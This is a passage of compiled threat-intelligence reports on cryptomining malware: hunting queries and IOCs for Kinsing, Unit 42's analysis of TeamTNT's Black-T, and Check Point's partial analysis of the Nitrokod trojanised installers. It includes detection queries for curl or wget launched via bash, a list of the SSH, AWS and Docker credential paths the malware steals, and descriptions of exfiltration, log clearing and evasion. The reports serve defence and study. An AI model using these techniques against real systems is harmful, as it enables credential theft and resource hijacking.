+1. To find the potential misuse of Java applications to open bash process: processFilePath:/bin/java AND
+objectFilePath:/usr/bin/bash 
+2. To find the use of curl or wget initiated by Java via bash:
+a.      processFilePath:/bin/java AND objectFilePath:/usr/bin/bash AND (objectCmd:curl or objectCmd:wget)
+3. To find the execution of Base64-decoded string execution by Java via bash:
+a.      processFilePath:/bin/java AND objectFilePath:/usr/bin/bash AND objectCmd:base64
+How Trend Micro Vision One and Trend Micro Cloud One – Workload Security can help
+thwart vulnerability exploitation
+In this blog entry, we discussed how malicious actors exploited a two-year-old vulnerability and attempted to deploy the
+Kinsing malware into a vulnerable system. The successful exploitation of this vulnerability can lead to RCE, which can allow
+attackers to perform a plethora of malicious activities on affected systems. This can range from malware execution, as in the
+case of our analysis, to theft of critical data, and even complete control of a compromised machine.
+Trend Micro Vision One helps security teams gain an overall view of attempts in ongoing campaigns by providing them a
+correlated view of multiple layers such as email, endpoints, servers, and cloud workloads. Security teams can gain a broader
+perspective and a better understanding of attack attempts and detect suspicious behavior that would otherwise seem benign
+when viewed from a single layer alone.
+Meanwhile, Trend Micro Cloud One – Workload Security helps defend systems against vulnerability exploits, malware, and
+unauthorized change. It can protect a variety of environments such as virtual, physical, cloud, and containers. Using
+advanced techniques like machine learning (ML) and virtual patching, the solution can automatically secure new and
+existing workloads both against known and new threats.
+MITRE ATT&CK Technique IDs
+Technique
+Exploit Public-Facing Application
+Command and Scripting Interpreter: Unix Shell
+Resource Hijacking
+Indicator Removal on Host: Clear Linux or Mac System Logs
+ID
+T1190
+T1059.004
+T1496
+T1070.002
+File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification T1222.002
+Impair Defenses: Disable or Modify System Firewall
+ Indicator Removal on Host: File Deletion
+Scheduled Task/Job: Cron
+Impair Defenses: Disable Cloud Logs
+IOCs
+URLs:
+hxxp://91[.]241[.]19[.]134/wb.sh
+hxxp://185[.]14[.]30[.]35/kinsing
+hxxp://185[.]14[.]30[.]35/wb.sh
+hxxp://195[.]2[.]79[.]26/kinsing
+hxxp://195[.]2[.]79[.]26/wb.sh
+hxxp://195[.]2[.]78[.]230/wb.sh
+hxxp://193[.]178[.]170[.]47/wb.sh
+hxxp://178[.]20[.]40[.]200/wb.sh
+hxxp://94[.]103[.]89[.]159/wb.sh
+T1562.004
+T1070.004
+T1053.003
+T1562/008
+12/13
+hxxp://185[.]231[.]153[.]4/wb.sh
+hxxp://195[.]2[.]85[.]171/wb.sh
+hxxp://80[.]92[.]204[.]82/wb.sh
+hxxp://195[.]2[.]84[.]209/kinsing
+hxxp://193[.]178[.]170[.]47/kinsing
+hxxp://178[.]20[.]40[.]200/kinsing
+File hashes
+SHA-256
+Detection name
+020c14b7bf5ff410ea12226f9ca070540bd46eff80cf20416871143464f7d546
+Trojan.SH.CVE20207961.SM
+5D2530B809FD069F97B30A5938D471DD2145341B5793A70656AAD6045445CF6D Trojan.Linux.KINSING.USELVCR22
+IP addresses
+212[.]22[.]77[.]79
+185[.]234[.]247[.]8
+185[.]154[.]53[.]140
+Recommended for you
+cloud
+13/13
+Black-T: New Cryptojacking Variant from TeamTNT
+unit42.paloaltonetworks.com/black-t-cryptojacking-variant
+October 5, 2020
+By Nathaniel Quist
+October 5, 2020 at 6:00 AM
+Category: Cloud, Unit 42
+Tags: AWS credential stealing, Crytojacking, exposed Docker Daemon API, memory password scraping, TeamTnT
+This post is also available in: 日本語 (Japanese)
+Executive Summary
+Unit 42 researchers discovered a new variant of cryptojacking malware named Black-T, authored by TeamTNT, a group
+known to target AWS credential files on compromised cloud systems and mine for Monero (XMR). Black-T follows the
+traditional TeamTNT tactics, techniques and procedures (TTPs) of targeting exposed Docker daemon APIs and
+performing scanning and cryptojacking operations on vulnerable systems of affected organizations. However, code
+within the Black-T malware sample gives evidence of a shift in TTPs for TeamTNT operations.
+Of these new TTPs, most notable are the targeting and stopping of previously unknown cryptojacking worms (i.e. the
+Crux worm, ntpd miner, and a redis-backup miner). Also, TeamTNT has been implementing the use of memory
+password scraping operations via mimipy and mimipenguins, which are *NIX equivalents to the commonly used
+Windows-specific memory password scraper functionality of Mimikatz. Mimikatz is a tool capable of scraping plaintext
+passwords from Windows OS systems, and also has the capability to perform pass-the-hash and pass-the-token
+operations, allowing attackers to hijack user sessions. Any identified passwords which were obtained through
+mimipenguins are then exfiltrated to a TeamTNT command and control (C2) node. This is the first time TeamTNT
+actors have been witnessed including this type of post-exploitation operation in their TTPs.
+The Black-T tool also has the capability to use three different network scanning tools to identify additional exposed
+Docker daemon APIs, within the local network of the compromised system and across any number of publicly accessible
+networks, to extend their cryptojacking operations. Both masscan and pnscan have been used before by TeamTNT
+actors. However, the addition of zgrab, a GoLang network scanner, marks the first time that a GoLang tool has been
+witnessed incorporated into TeamTNT’s TTPs. There was also an update to the masscan network scanner operation to
+include searching for TCP port 5555. While the exact purpose regarding adding port 5555 to the scanner is unknown,
+there have been documented cases where XMR cryptojacking is occurring on Android-based devices. This could indicate
+a new unknown target set for expanding TeamTNT cryptojacking operations. However, there is little evidence to support
+TeamTNT targeting Android devices.
+Unit 42 researchers have discovered several German-language phrases inserted into multiple TeamTNT scripts, Black-T
+included. The very first line within the script following an ASCII art banner reads: verbose mode ist nur für euch 😉
+damit ihr was zum gucken habt in der sandbox :-* which translates to “verbose mode is only for you 😉 so that you have
+1/10
+something to watch in the sandbox.” There have been several other cases where German phrases have been used within
+TeamTNT scripts.
+Palo Alto Networks Prisma Cloud can assist in securing cloud deployments against the threats posed by TeamTNT, by
+guiding organizations to better detect vulnerabilities or misconfigurations in cloud environment settings and
+infrastructure as code (IaC) templates prior to deploying production systems. Additionally, by installing the latest apps
+and threat definitions on Palo Alto Networks Next-Generation Firewall, network connections to known XMR public
+mining pools, or to malicious domains and IPs, can be prevented before the environment is compromised.
+Black-T Dissection
+The Black-T script is downloaded from the TeamTNT domain, hxxps://teamtnt[.]red/BLACK-T/SetUpTheBLACK-T, to
+the compromised cloud system that maintained an exposed Docker daemon API. Once downloaded to the compromised
+system, the script will perform the following actions.
+Figure 1. TeamTNT’s Black-T ASCII banner.
+First, there is a display of an ASCII art banner declaring that this variant is version 1 (see Figure 1). Then, the script
+performs a clean and system prep operation, in which the script will remove known cryptojacking malware already in
+place on the compromised system. Black-T specifically targets Kinsing malware, a competing cryptojacking process
+family. It is also important to note that TeamTNT authors have copied several pieces of malware code, both within
+previous TeamTNT tools as well as within this Black-T tool, to augment their own cryptojacking malware. Specifically,
+this copied code allows for the removal and evasion of Aliyun and Tencent cloud security software, and adds AWS
+credential-stealing features and masscan scanning functionality.
+Disable Active XMR Miners
+Unit 42 researchers also found evidence that the TeamTNT authors are now targeting other potential competing
+cryptojacking malware families, outside of the previously mentioned kinsing cryptojacking process. These competing
+cryptojacking processes include kswapd0, ntpd miner, redis-backup miner, auditd miner, migration miner, and finally,
+the Crux worm (see Figure 2) as well as the Crux worm miner (see Figure 3). With the inclusion of these potential
+cryptojacking processes found within the Black-T malware, it would appear that these cryptojacking processes are
+known to the TeamTNT authors as competing for cloud processing resources. This would also indicate there are several
+cryptojacking processes currently unknown to defense teams and efforts should be taken to identify and build
+mitigation rules for these currently unknown cryptojacking processes. There is an XMR public mining pool called
+cruxpool[.]com. However, no additional information is currently available to support if the Crux worm uses the public
+mining pool cruxpool, or if this is simply a clever naming convention used by cryptojacking operators.
+Following the cleaning of any known cryptojacking processes, the Black-T malware will also perform a cleaning
+operation for any known xmrig process currently running on the compromised system. XMRig is a popular open-source
+process, which facilitates the computational operations needed to mine the XMR cryptocurrency.
+2/10
+Figure 2. Crux worm process removal.
+Figure 3. Crux worm mining process removal.
+Of note, TeamTNT makes use of customized processes within their scripts. These custom processes represent traditional
+*NIX processes, but have the prefix “tnt” added to the process name. For example, tntrecht is a customized process that
+is loaded into /usr/local/bin/tntrecht on the compromised system and is likely used to hijack and modify the
+permissions of legitimate *NIX processes to be used for TeamTNT operations. The modified legitimate processes are
+subsequently renamed with the “tnt” prefix – for instance, tntwget and tntcurl.
+System Setup
+Following the cleanup of the compromised system, the script will further set up the system environment by setting Path
+Variables: PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin, naming 8.8.4.4 and 8.8.8.8 as new DNS servers, and
+finally, flushing all established IP table rules using the command iptables -F.
+The script will then check to see which *NIX package manager is installed on the compromised system: Advanced
+Package Tool (APT), Yellowdog Updater, Modified (YUM) or Alpine Linux package manager (APK). Regardless of the
+package manager type identified, the script will install masscan, along with libpcap to perform network packet traffic
+listening, pnscan (a network scanning tool, although within the current sample, pnscan functionality has been
+commented out), zgrab (a GoLang tool built for zmap), Docker and jq (a flexible command-line JSON processor). See
+the setup image in Figure 4.
+Figure 4. APT package manager setup.
+3/10
+Unit 42 researchers believe that TeamTNT actors are planning on building more sophisticated cryptojacking features
+into their tool sets – specifically for identifying vulnerable systems within various cloud environments. Never before has
+TeamTNT been known to use the network scanner software zmap. But TeamTNT is not only using zmap, they are using
+the little-known zgrab, which is a GoLang tool used to capture address banners. It is currently unclear how TeamTNT
+actors will use this data, but it is highly likely the actors are giving zgrab a trial run to test the scanner’s functionality for
+their operations, and may make adjustments accordingly. This idea is supported by the zgrab GitHub page, which states
+that, “zgrab tends to be very unstable, API's may break at any time, so be sure to vendor zgrab.” It is further supported
+by the fact that during the time of writing this blog, zmap had deprecated the original zgrab tool, which was used in
+Black-T, and has replaced it with a new version of zgrab, called zgrab2.
+Unit 42 researchers do know that TeamTNT actors are placing a great deal of importance on scanning capabilities
+within the Black-T tool, as there are currently three different scanners built into this tool (masscan, pscan and zgrab).
+Download Toolsets
+The Black-T variant downloads two files, which execute directly into bash: hxxps://teamtnt[.]red/BLACK-T/beta and
+hxxps://teamtnt[.]red/BLACK-T/setup/bd.
+Beta
+Beta is used to make a new directory /.../ where the following files are compressed into two tar files named root.tar.gz:
+/root/.bash_history
+/root/.ssh/
+/etc/hosts
+/root/.docker/
+/root/.aws/
+/root/*.sh
+/home/*/.bash_history
+/home/*/.ssh/
+/home/*/*.sh
+And, cron.tar.gz:
+/etc/cron*/
+/var/spool/cron/
+These two files, upon compression, are then sent to the URL hxxps://teamtnt[.]red/only_for_stats/dup.php. It is
+important to note that TeamTNT actors are still targeting AWS credential and configuration files located on
+compromised AWS cloud systems. If compromised systems do contain AWS credentials, the TeamTNT actors could
+attempt to use these AWS credentials to expand their cryptojacking operations within the compromised system’s AWS
+environment. By using the AWS credentials obtained from the exposed and compromised Docker daemon system,
+TeamTNT actors could use this system as a pivot point to gain access to additional cloud systems and resources that use
+the same AWS credentials and which are hosted within the system’s larger AWS environment.
+The beta script then downloads the file hxxps://teamtnt[.]red/x/pw, and also downloads the
+hxxps://teamtnt[.]red/BLACK-T/setup/bd, which is a duplicate from the Black-T download.
+Finally, the beta script will set the service token for monitoring XMR mining operations. This token is set as
+abyofigfefda6c3itn9f3zkrmjfays31, and it will redownload the Black-T script, hxxps://teamtnt[.]red/BLACK-
+T/SetUpTheBLACK-T. This is likely done as a means of redundancy to provide actors with different types of operations
+to launch following the exploitation of a system.
+pw
+The script pw is very intriguing, as it performs post-exploitation operations of password scraping using mimipy and
+mimipenquin, which are *NIX tools adapted for use from the Windows tool Mimikatz. Upon uncovering any passwords
+residing in memory within the compromised system, the passwords are written to the file /var/tmp/.../output.txt, which
+is then uploaded to hxxps://teamtnt[.]red/only_for_stats/dup.php. See Figure 5.
+4/10
+bd
+Figure 5. Memory password scraping and exfil.
+The script bd is used to download the XMR mining software relevant to the given compromised system. These
+downloaded files and the SHA256 values for the mining software have been reported on before during an operation
+targeting Weave Scope deployments.
+Unit 42 researchers downloaded each of the software samples and believe these samples to be the same style of samples
+that have been previously reported (see Table 1).
+Figure 6. Downloaded mining software.
+Name
+SHA-256 Hash
+Note/VirusTotal
+Findings
+bioset
+kube
+a5dd446b2a7b8cfd6b6fd4047cc2fddfcea3a4865d8069dcd661e422046de2a1
+Possibly corrupted
+a506c6cf25de202e6b2bf60fe0236911a6ff8aa33f12a78edad9165ab0851caf
+VT = 33/60
+kube.jpg
+tshd
+a5e6b084cdabe9a4557b5ff8b2313db6c3bb4ba424d107474024030115eeaa0f Possibly Corrupt 
+VT = 1/60
+docker-
+update
+139f393594aabb20543543bd7d3192422b886f58e04a910637b41f14d0cad375 VT = 35/60 
+default.jpg
+Table 1. TeamTNT XMR mining software.
+XMR Miner Setup
+The Black-T script then downloads the known XMR miner software sbin_u, (SHA256:
+fae2f1399282508a4f01579ad617d9db939d0117e3b2fcfcc48ae4bef59540d9). This type of mining software has been
+linked before to TeamTNT. VirusTotal currently only lists the malware as an 8/62, but does label it as an Executable
+Linkable Format (ELF) CoinMiner (see Figure 7), mining software which operates on *NIX platform systems.
+5/10
+Figure 7. VirusTotal metadata of the file sbin_u
+Finally, Black-T configures the XMR mining software to use the following XMR wallet address:
+84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8.
+Figure 8 shows that as of the time of this writing, only five workers were reported producing 8.2 KH/s, which is down
+from a maximum of 25.05 KH/s on September 26, 2020. This particular XMR wallet has only managed to gather
+roughly US$10 as of September 29, 2020, likely due to the fact that this is a very new variant of cryptojacking software
+and hasn’t had much time to spread.
+Figure 8. MoneroOcean results for the Black-T XMR wallet address.
+Worm Functionality
+TeamTNT has long maintained its usage of worm-like techniques and has used masscan or pnscan to discover
+vulnerable systems. Black-T is no exception. However, there is a subtle difference between previously reported
+TeamTNT masscan operations and those present within Black-T. Specifically, in Black-T, we see the addition of a new
+scanning port, TCP 5555 (see Figure 9). While the exact purpose of adding port 5555 to the scanner is unknown, there
+have been documented cases where XMR cryptojacking is occurring on Android-based devices. This could indicate a
+new unknown target set for expanding TeamTNT cryptojacking operations. However, there is little evidence to support
+TeamTNT targeting Android devices.
+6/10
+Figure 9. TeamTNT masscan scanning operations.
+Additionally, Black-T also performs scanning operations on a random CIDR 8 network range as it searches for exposed
+Docker API instances. This is also a new finding related to TeamTNT TTPs (see Figure 10). By expanding the scanning
+range of Black-T, TeamTNT actors are greatly expanding the scope of their targeting operations. Instead of only
+scanning the local network range of a compromised system, Black-T will begin scanning an entire CIDR 8 network range
+at random. For example, if Black-T selects 134.0.0.0/8, any address between 134.0.0.0 and 134.255.255.255 which
+contains an exposed Docker daemon API will be targeted and Black-T will attempt to exploit that system. Given enough
+time, every publicly available IP address will be scanned for an exposed Docker daemon API system. This has the
+potential to greatly increase the number of compromised systems owned by TeamTNT actors.
+Figure 10. Random Docker API scanning operation.
+Conclusion
+TeamTNT is a cloud-focused cryptojacking group which targets exposed Docker daemon APIs. Upon successful
+identification and exploitation of the Docker daemon API, TeamTNT will drop the new cryptojacking variant Black-T.
+This variant installs up to three different types of network scanners (masscan, pnscan and zgrab), which are used to scan
+for additional exposed Docker daemon APIs. Black-T will also perform memory scraping operations following the
+successful exploitation of the cloud system. This is performed via mimipy and mimipenguins scripts, which are
+downloaded to the compromised system. Any identified passwords are then exfiltrated to a TeamTNT C2 node. Similar
+to the stolen AWS credentials also captured by the TeamTNT actors, these credentials are likely to be used for additional
+operations targeted against the organization managing the compromised Docker API.
+In order to protect cloud systems from TeamTNT’s Black-T cryptojacking malware, organizations should perform the
+following actions:
+Ensure that cloud environments are not exposing Docker daemon APIs or any other network service, which
+inadvertently exposes sensitive internal network services.
+Leverage Palo Alto Networks Prisma Cloud to secure cloud deployments.
+7/10
+Install the latest apps and threat definitions on the Palo Alto Networks Next-Generation Firewall.
+Indicators of Compromise
+URLs
+hxxps://teamtnt[.]red
+hxxps://teamtnt[.]red/BLACK-T/beta
+hxxps://teamtnt[.]red/BLACK-T/CleanUpThisBox
+hxxps://teamtnt[.]red/BLACK-T/setup/bd
+hxxps://teamtnt[.]red/BLACK-T/setup/docker-update
+hxxps://teamtnt[.]red/BLACK-T/setup/hole
+hxxps://teamtnt[.]red/BLACK-T/setup/kube
+hxxps://teamtnt[.]red/BLACK-T/setup/tshd
+hxxps://teamtnt[.]red/BLACK-T/SetUpTheBLACK-T
+hxxps://teamtnt[.]red/BLACK-T/SystemMod
+hxxps://teamtnt[.]red/ip_log/getip[.]php
+hxxps://teamtnt[.]red/only_for_stats/dup[.]php
+hxxps://teamtnt[.]red/x/getpwds[.]tar[.]gz
+hxxps://teamtnt[.]red/x/pw
+hxxps://iplogger[.]org/blahblahblah
+Monero Mining Pool
+MoneroOcean[.]stream
+SHA-256 Hashes
+Black-T related hashes
+SHA-256 Hash
+Filename
+90c74c9ff4c502e155d2dc72f3f6c3f512d354d71b5c480c89b6c1b1852bcb1f
+bd.bin
+1cf803a8dd2a41c4b976106b0ceb2376f46bafddeafbcef6ff0c312fc78e09da
+beta.bin
+a5dd446b2a7b8cfd6b6fd4047cc2fddfcea3a4865d8069dcd661e422046de2a1
+bioset.bin
+9f8cb3f25a8b321b86ee52c16b03b3118f3b157b33e29899d265da3433a02c79
+SetUpTheBLACK-T.bin
+6c16473060ffd9e215ee8fc82ff430384a8b99ea85000486f363e9bff062898d
+cleanupthisbox.bin
+139f393594aabb20543543bd7d3192422b886f58e04a910637b41f14d0cad375
+docker-update.bin
+5b417032a80ddf4d9132a3d7d97027eeb08d9b94b89f5128863930c1967c84c4
+getpwds.tar.gz
+e92b19f535fa57574401b6cdbf511a234a0b19335bd2ad6751839c718dc68e4d
+gimmecredz.sh
+a506c6cf25de202e6b2bf60fe0236911a6ff8aa33f12a78edad9165ab0851caf
+kube.bin
+c0069aab1125a8ac1b9207e56371e86693b26b0dcab1630f337be55929b36a2a pw.bin
+fae2f1399282508a4f01579ad617d9db939d0117e3b2fcfcc48ae4bef59540d9
+sbin_u
+84fabfbbd134bbeeb5481a96b023f44a671382349e5b39928baf0e80e28fd599
+setup_moneroocean_miner.bin
+8/10
+06e9cb770c61279e91adb5723f297d472a42568936199aef9251a27568fd119f
+systemmod.bin
+a5e6b084cdabe9a4557b5ff8b2313db6c3bb4ba424d107474024030115eeaa0f
+tshd.bin
+Mimipy and Mimipenguin Related Hashes
+SHA-256 Hash
+Filename
+79b478d9453cb18d2baf4387b65dc01b6a4f66a620fa6348fa8dbb8549a04a20
+mimipenguin.py
+3acfe74cd2567e9cc60cb09bc4d0497b81161075510dd75ef8363f72c49e1789
+mimipenguin.sh
+73a956f40d51da737a74c8ad4ecbfab12350621ffc167b5c278cd33ce9e0e0f0
+mimipy.py
+b9b3a97ed5c335b61f2cc9783cb8f24c9cff741d020b850502542dbd81c2c2df
+pack.py
+1f09ccae15d8d452bde39f7ada9660df3cf0598137c5ac7a47027d8b9107415d
+pupyimporter.py
+023283c035a98fcb0b4d32bc103a44df5844c5e41c82261e0d029180cde58835
+dbg.h
+a0d4cbbb61e3b900a990a2b06282989c70d5d7cb93052ad7ec04dcd64701d929 max.h
+6cbf056fe35f1a809b8e8a2a5fc1f808bb4366e6e1ca2767fb82832d60c9ecf8
+scanner.h
+9469e2937be4cf37e443ba263ffc1ee9aa1cf6b6a839ad60e3ecfe3e9e1bc24e
+targets.h
+9703cd1d00bf6f55b5becb1dd87ffcbd98b2ac791c152f7adcb728c5512df5e2
+users.h
+88226956193afb5e5250639bd62305afde125a658b7e924ce5a5845d08f7de08
+mimipenguin.c
+54d7524c73edbd9fe3cfa962656db23d6a2d8e4ebc6a58b116b3b78d732acfdf
+scanner.c
+ac54934dd9b3b55296baf3e4d1aec959f540bed71d02a6f624edab281a719bdf
+targets.c
+00f116b831f720b62acf3a2d0db2a870b6ae114c4f9b3b517362a49c42c5a6f3
+users.c
+Monero Wallet
+84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8
+Most Read Articles
+Russia’s Trident Ursa (aka Gamaredon APT) Cyber Conflict Operations Unwavering Since Invasion of Ukraine
+people reacted
+Russia’s Trident Ursa (aka Gamaredon APT) Cyber Conflict Operations Unwavering Since
+Invasion of Ukraine
+26
+15 min. read
+people reacted
+Threat Brief: OWASSRF Vulnerability Exploitation
+9/10
+Threat Brief: OWASSRF Vulnerability Exploitation
+11
+9 min. read
+Wireshark Tutorial: Decrypting HTTPS Traffic
+people reacted
+Wireshark Tutorial: Decrypting HTTPS Traffic
+163
+7 min. read
+Get updates from Palo Alto Networks!
+Sign up to receive the latest news, cyber threat intelligence and research from us
+By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
+10/10
+research.checkpoint.com /2022/check-point-research-detects-crypto-miner-malware-disguised-as-google-translate-des…
+Check Point Research detects Crypto Miner malware
+disguised as Google translate desktop and other legitimate
+applications
+ August 29, 2022
+Research by: Moshe Marelus
+Highlights:
+Check Point Research (CPR) detected a Turkish based crypto miner malware campaign,
+dubbed ‘Nitrokod’, which infected machines across 11 countries
+The malware is dropped from popular software available on dozens of free software
+websites
+The malware distributers separate malicious activity from the downloaded fake software to
+avoid detection
+Attack was initially found by Check Point XDR, which overcomes the attack’s evasion
+mechanism. 
+Introduction
+At the end of July 2022, Check Point Research (CPR) detected a previously undisclosed cryptomining
+campaign, called Nitrokod, which potentially infected thousands of machines worldwide.
+1/13
+At the campaign’s core there are several useful utilities. Created by a Turkish speaking entity, the
+campaign dropped malware from free software available on popular websites such as Softpedia and
+uptodown. The software can also be easily found through Google when users search “Google Translate
+Desktop download”.
+While the applications boast a “100 CLEAN” banners on some site, the applications are in fact
+Trojanized, and contain a delayed mechanism to unleash a long multi-stage infection that ends with a
+cryptomining malware.
+After the initial software installation, the attackers delayed the infection process for weeks and deleted
+traces from the original installation. This allowed the campaign to successfully operate under the radar for
+years.
+Figure 1: Top results for “Google Translate Desktop download”
+Nitrokod
+Active since 2019, Nitrokod is a Turkish speaking software developer that claims to offer free and safe
+software.
+Most of the programs Nitrokod offers are popular software that do not have an official desktop version.
+For example, the most popular Nitrokod program is the Google Translate desktop application. Google has
+not released an official desktop version, making the attackers’ version very appealing.
+2/13
+Figure 2: Nitrokod[.]com
+Most of their developed programs are easily built from the official web pages using a Chromium based
+framework. For example, the Google translate desktop application is converted from the Google
+Translate web page (https://translate.google.com) using the CEF project. This gives the attackers the
+ability to spread functional programs without having to develop them.
+To avoid detection, the Nitrokod authors separate malicious activity from the initially downloaded Nitrokod
+program:
+The malware is first executed almost a month after the Nitrokod program was installed.
+The malware is delivered after 6 earlier stages of infected programs.
+The infection chain continued after a long delay using a scheduled task mechanism, giving the
+attackers time to clear the evidence.
+Infection Chain
+3/13
+Figure 3: infection chain
+Infection chains are similar in most Nitrokod campaigns, starting with the installation of an infected
+program downloaded from the Web.
+Once the user launches the new software, an actual Google Translate application is installed. In addition,
+an updated file is dropped which starts a series of four droppers until the actual malware is dropped.
+After the malware is executed, the malware connects to its C&C server to get a configuration for the
+XMRig crypto miner and starts the mining activity.
+Stage 1 – Web Installer
+The initial stage of the campaign begins with downloading one of the Nitrokod infected programs. The
+“Google Translate Desktop” program is used in this demonstration, but the behaviors are similar in all
+other infected programs.
+4/13
+Figure 4: hundreds of thousands according to popular software web sites
+GoogleTranslateDesktop.exe is a Windows installer built with Inno setup, a free tool for packaging and
+building setup files. The installer starts by downloading an encrypted RAR file from
+hxxp://nitrokod[.]com/download/GoogleTranslateDesktop.rar. As a means of protection against random
+scans and downloads, the file is only downloaded from the attacker’s server if the user-agent is set to
+“InnoDownloadPlugin/1.5” (Inno setup deflate user agent). Then GoogleTranslateDesktop2.50.exe is
+extracted from the RAR file using “asx” as the password.
+Stage 2 – Installer
+The GoogleTranslateDesktop2.50.exe installer starts by installing the Google Translate application on the
+following path: “C:\Program Files (x86)\Nitrokod\Google Translate Desktop\GoogleTranslateDesktop.exe”
+After installation, the installer checks if an update.exe file exists on the following path
+“C:\ProgramData\Nitrokod”. If the file does not exist or the file version is not 1.0.7.0, the 3rd stage
+5/13
+dropper update.exe is dropped. To maintain persistence, a schedule task is set to start the update at
+every system startup.
+Finally, the installer sends a Post Install message to the Nitrokod domain with some information on the
+infected machine. All the details are sent as arguments on a HTTP GET requests, as shown below:
+Figure 5: Post install message
+Stage 3 – Delayed Dropper
+The stage 3 dropper (update.exe) is programed to run at least five days after the installation time. It does
+so by maintaining two registry keys.
+“HKCU\Software\Update\D” – stores the last run time date.
+“HKCU\Software\Update\S” – acts as a counter.
+Each time the updater is executed (on every system startup) it checks if the last execution data is equal
+to the current date. If not, the counter is incremented by one. Once the counter hits the value 4, the 4th
+stage dropper chainlink1.07.exe is extracted from another encrypted RAR file. In reality, this operation
+requires at least four restarts on four different days, which would often translate into at least several
+weeks of normal user’s usage. This mechanism is also a great way to avoid Sandbox detection, which
+does not run over several days and multiple restarts.
+Stage 4 –Scheduled Tasks and Log clearing
+The 4th stage dropper is in charge of creating four different schedule tasks.
+Task Name:
+Description:
+Runs
+6/13
+InstallService\1 Drop an encrypted RAR file via Wget
+InstallService\2 Extract Dropper 5 from RAR file
+InstallService\3 Run Dropper 5
+InstallService\4 Clear system logs
+every
+15d
+2d
+1d
+3d
+After creating all the tasks listed above, stage 4 clears all system logs using the PowerShell command
+Clear-EventLog. Then stage 3 and 4 are self-deleted.
+At this point, all related files and evidence are deleted and the next stage of the infection chain will
+continue after 15 days by the windows utility schtasks.exe. This way, the first stages of the campaign are
+separated from the ones that follow, making it very hard to trace the source of the infection chain and
+block the initial infected applications.
+After 15 days, an encrypted RAR file is downloaded from intelserviceupdate[.]com via the first schedule
+task. The next day, the file is decompressed via the second schedule task and the stage 5 file is
+extracted. One day later, the stage 5 file is executed by the third task.
+Stage 5 – VM tests with Firewall and Defender Exclusions
+The stage 5 dropper starts by checking if certain programs are installed on the infected machine. First, it
+checks against a list of known virtual machine processes and then against a list of mainly security
+products. If one of the programs are found, the program exits.
+Figure 6: ISINSTALL function
+Then a firewall rule is added to allow incoming network connections for a program that will be dropped in
+the following stage, named nniawsoykfo.exe.
+Figure 7: Firewall added rule
+Next, the Windows Defender activity is excluded on the following path:
+7/13
+Temp folder
+C:\system32\nniawsoykfo.exe – the file is dropped in the next stage.
+C:\system32\powermanager.exe – the file is dropped in the next stage.
+Finally, the program drops the last dropper (stage 6) nniawsoykfo1.8.exe from an encryption RAR file and
+executes it.
+Stage 6 – Miner dropper
+The stage 6 dropper is in charge of dropping the following three files:
+Powermanager.exe – The malware controlling the miner.
+nniawsoykfo.exe – XMRig crypto miner.
+WinRing0.sys – that is part of the XMRig.
+To maintain persistence, a schedule task is set to start the malware (powermanager.exe) every day.
+Stage 7 – Cryptomining Malware – powermanager.exe:
+On the next day, the malware is executed by the above schedule task. The malware enumerates all the
+security products installed on the infected machine. Next, it determines if the infected machine platform is
+a desktop or a laptop. For desktop detection, the malware makes the following three checks:
+No battery status.
+The RAM type is not SODIMM (enum 12), that is used in laptops.
+The system type is 1 (Desktop).
+8/13
+Figure 8: identify platform
+After that, the bot connects to its C&C server nvidiacenter[.]com and sends the following data in a JSON
+format over a HTTP POST requests:
+Key
+idle_minute
+pc_time
+Antivirus
+up_minute
+version
+xmrig_version
+Guid
+core
+machine_id
+reference
+Value
+Last user event in minutes.
+Time on the infected machine.
+List of all security products on the infected machine.
+Minutes passed since last startup.
+The version of the “Powermanager.exe” malware.
+The version of the XMRig
+The infected machine GUID.
+Number of processor cores.
+A generated identifier of the infected machine.
+The value of “SOFTWARE\Microsoft\Update\reference” the registry key
+The data is then encoded by the following steps:
+9/13
+1. Convert the JSON to a string.
+2. Reverse the string.
+3. Encode the string with base64.
+4. Reverse the encoded string
+5. Encode the string again with base64.
+The C&C response is decoded the same way it was encoded, but in reverse. The response contains
+instructions for controlling the malware and the XMRig miner as shown below:
+abort
+rules
+server_time
+command_line
+refresh_minute
+excluding_process
+Should the malware continue to run or abort.
+A set of conditions when to run the miner, on what platform and how much
+CPU to use.
+The server time.
+The command line argument passed to the XMRig crypto miner.
+The next time to connect to the C&C in minutes.
+A list of program names. If one of them is running, the malware should
+exit.
+Check Point’s XDR (Extended Detection and Response)
+CPR detected this new crypto miner malware campaign using Check Point’s Infinity XDR (Extended
+Detection and Response) platform, a prevention-focused XDR Solution. This tool allows SOC teams to
+quickly detect, investigate, and respond to attacks across their entire IT infrastructure. It identifies threats
+inside the organization and prevents their expansion by leveraging data correlated from all products,
+including Endpoint, Network, Web security, and so on.
+XDR has multiple behavioral detections that can find the stealthiest threats. In this case, the malware was
+using multiple evasion techniques like masquerading as known applications, using scheduled tasks
+instead of direct actions, and spacing its activities over a long period of time.
+XDR was able to detect and respond to every individual malware action, follow up over time and correlate
+between all the singular detections from endpoints and network to one single attack, raise the confidence
+to a point that allows automatic response from all relevant devices, and prevent it from happening to
+other machines in the network.
+XDR prevention capabilities extend to all Check Point devices and products, allowing it to take actions
+like removing malicious files from the endpoints, and add indicators of compromise of all files, URLs,
+domain addresses and IPs to be blocked by endpoints, gateways and mobiles.
+XDR’s unique Prevention-first approach significantly improves customers’ overall security posture while
+detecting unknown zero-day threats. It detects and stops attacks by combining advanced threat
+prevention powered by AI-based analytics, big-data threat intelligence, multi-layered incident analysis,
+machine learning, and enterprise-wide visibility into customer’s network, cloud, email, endpoint, all from a
+single pane of glass.
+*Check Point’s XDR is at early availability stage and will become generally available in coming
+months
+10/13
+Timeline of attack and Check Point’s XDR detection
+Screenshot from Check Point’s Infinity XDR
+Check Point protections:
+11/13
+Check Point Harmony Endpoint:
+Win.Nitrokod.A.
+Win.Nitrokod.B.
+Win.Nitrokod.C.
+Remediation:
+To clean an infected machine, follow these steps.
+1. Remove the following files on system32:
+Any file starting with chainlink.
+nniawsoykfo.exe
+powermanager.exe
+2. Remove the updater.
+Remove the folder C:\ProgramData\Nitrokod.
+3. Remove malicious schedule tasks.
+InstallService\1
+InstallService\2
+InstallService\3
